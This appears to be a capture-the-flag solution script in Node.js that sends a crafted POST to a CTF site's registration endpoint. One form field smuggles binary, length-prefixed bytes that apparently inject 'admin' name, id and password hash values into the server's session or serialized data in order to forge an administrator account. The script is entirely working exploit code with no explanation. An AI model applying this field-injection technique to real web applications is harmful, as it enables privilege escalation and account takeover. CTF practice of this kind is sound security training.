const axios = require('axios');
const querystring = require('querystring');

axios({
    method: 'post',
    url: `https://books.web.ctfcompetition.com/user/register`,
    headers: {
        referer: 'https://books.web.ctfcompetition.com/user/register',
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    data: querystring.stringify({
        'name': 'nytr0gen1337',
        'age': 20,
        'desc': '1234',
        "zzzz\u00bd\u00bd\u00bd\u00bd\u00bd\u0001\u0005\u0000\u0000\u0000": "\u0004\u0000\u0000\u0000name\u0001\u0005\u0000\u0000\u0000admin" +
        "\u0002\u0000\u0000\u0000id\u0001@\u0000\u0000\u00008c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" +
        "\u0008\u0000\u0000\u0000password\u0001@\u0000\u0000\u000065e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5" +
        "\u0002\u0000\u0000\u0000pl\u0001\u00ff\u00ff\u0000\u0000",
        'password': 'qwerty',
    }),
}).then((response) => {
    console.log(response.data);
}).catch((err) => {
    console.error(err);
});
